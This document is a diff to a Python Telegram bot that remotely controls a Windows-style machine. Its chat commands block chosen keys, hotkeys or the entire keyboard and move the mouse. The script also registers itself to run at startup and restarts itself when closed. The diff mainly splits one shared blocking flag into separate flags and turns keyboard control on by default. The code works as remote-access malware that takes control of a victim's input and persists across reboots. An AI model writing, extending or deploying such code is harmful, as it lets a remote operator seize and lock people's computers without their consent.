@@ -120,33 +120,32 @@ def unblock_keys(message):
     else:
         bot.send_message(message.chat.id, "buffer is empty", reply_markup=create_keyboard())
 
-blocking_thread = None
-blocking_active = False
+block_hotkeyss = False
 keys_to_block = []
 hotkeys_to_block = []
 
 @bot.message_handler(commands=['block_hotkeys'])
 def block_keys(message):
-    global blocking_active, hotkeys_to_block
+    global block_hotkeyss, hotkeys_to_block
 
     args = message.text.split(' ', 1)
     if len(args) < 2:
         bot.send_message(message.chat.id, "Usage: /block_hotkeys hotkey1;hotkey2", reply_markup=create_keyboard())
         return
 
-    if blocking_active:
+    if block_hotkeyss:
         bot.send_message(message.chat.id, "Hotkeys are already blocked", reply_markup=create_keyboard())
         return
 
     hotkeys_to_block = args[1].split(';')
-    blocking_active = True
+    block_hotkeyss = True
 
     def block_hotkeys_thread():
         try:
             for hotkey in hotkeys_to_block:
                 kb.add_hotkey(hotkey, lambda: None, suppress=True)
             bot.send_message(message.chat.id, f"Hotkeys are locked:: {', '.join(hotkeys_to_block)}. Use /unblock_keys to unblock it", reply_markup=create_keyboard())
-            while blocking_active:
+            while block_hotkeyss:
                 time.sleep(1)
         except Exception as e:
             bot.send_message(message.chat.id, f"Error when locking hotkeys: {e}", reply_markup=create_keyboard())
@@ -155,79 +154,82 @@ def block_keys(message):
 
 @bot.message_handler(commands=['unblock_hotkeys'])
 def unblock_keys(message):
-    global blocking_active, hotkeys_to_block
+    global block_hotkeyss, hotkeys_to_block
 
-    if not blocking_active:
+    if not block_hotkeyss:
         bot.send_message(message.chat.id, "Hotkeys are already unlocked", reply_markup=create_keyboard())
         return
 
-    blocking_active = False
+    block_hotkeyss = False
     kb.clear_all_hotkeys() 
     hotkeys_to_block = []
     bot.send_message(message.chat.id, "Hotkeys are unlocked", reply_markup=create_keyboard())
 
+block_keys_kbb = False
+
 @bot.message_handler(commands=['block_keys_kb'])
 def block_keys_kb(message):
-    global blocking_thread, blocking_active, keys_to_block
+    global block_keys_kbb, keys_to_block
 
     args = message.text.split(' ', 1)
     if len(args) < 2:
         bot.send_message(message.chat.id, "Usage: /block_keys_kb a;b;c", reply_markup=create_keyboard())
         return
-    if blocking_active:
+    if block_keys_kbb:
         bot.send_message(message.chat.id, "The keys are already locked", reply_markup=create_keyboard())
         return
 
     keys_to_block = args[1].split(';')
-    blocking_active = True
+    block_keys_kbb = True
 
     def block_selected_keys():
         try:
             for key in keys_to_block:
                 kb.block_key(key)
             bot.send_message(message.chat.id, f"Key lock: {', '.join(keys_to_block)}. Use /unblock_keys_kb to unblock it", reply_markup=create_keyboard())
-            while blocking_active:
+            while block_keys_kbb:
                 time.sleep(1)
         except Exception as e:
             bot.send_message(message.chat.id, f"Key lock error: {e}", reply_markup=create_keyboard())
 
-    blocking_thread = threading.Thread(target=block_selected_keys, daemon=True)
-    blocking_thread.start()
+    threading.Thread(target=block_selected_keys, daemon=True).start()
 
 @bot.message_handler(commands=['unblock_keys_kb'])
 def unblock_keys(message):
-    global blocking_active, keys_to_block
+    global block_keys_kbb, keys_to_block
 
-    if not blocking_active:
+    if not block_keys_kbb:
         bot.send_message(message.chat.id, "The keys are already unlocked", reply_markup=create_keyboard())
         return
 
-    blocking_active = False
+    block_keys_kbb = False
     for key in keys_to_block:
         kb.unblock_key(key)
     keys_to_block = [] 
     bot.send_message(message.chat.id, "Keys unlocked", reply_markup=create_keyboard())
 
+block_all_keyss = False
+
 @bot.message_handler(commands=['block_all_keys'])
 def block_all_keys(message):
-    global blocking_active, keys
+    global block_all_keyss, keys
 
     args = message.text.split(' ', 1)
     if len(args) < 1:
         bot.send_message(message.chat.id, "Usage: /block_all_keys", reply_markup=create_keyboard())
         return
-    if blocking_active:
+    if block_all_keyss:
         bot.send_message(message.chat.id, "The keys are already locked", reply_markup=create_keyboard())
         return
     
-    blocking_active = True
+    block_all_keyss = True
 
     def block_all_keys():
         try:
             for key in keys:
                 kb.block_key(key)
-            bot.send_message(message.chat.id, f"All keys are blocked. Use /unblock_keys to unblock it", reply_markup=create_keyboard())
-            while blocking_active:
+            bot.send_message(message.chat.id, f"All keys are blocked. Use /unblock_all_keys to unblock it", reply_markup=create_keyboard())
+            while block_all_keyss:
                 time.sleep(1)
         except Exception as e:
             bot.send_message(message.chat.id, f"Key lock error: {e}", reply_markup=create_keyboard())
@@ -237,13 +239,13 @@ def block_all_keys(message):
 
 @bot.message_handler(commands=['unblock_all_keys'])
 def unblock_keys(message):
-    global blocking_active, keys
+    global block_all_keyss, keys
 
-    if not blocking_active:
+    if not block_all_keyss:
         bot.send_message(message.chat.id, "keys are already unlocked", reply_markup=create_keyboard())
         return
 
-    blocking_active = False
+    block_all_keyss = False
     try:
         for key in keys:
             kb.unblock_key(key)
@@ -407,7 +409,7 @@ def move_mousik(message):
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())
 
-keyboard_start = False
+keyboard_start = True
 letter = False
 
 def Keyboardik(klavishi, lett):
@@ -653,6 +655,5 @@ def echo_all(message):
 
 if __name__ == '__main__':
     restart_on_exit()
-
     add_to_startup_for_device()
     bot.polling()
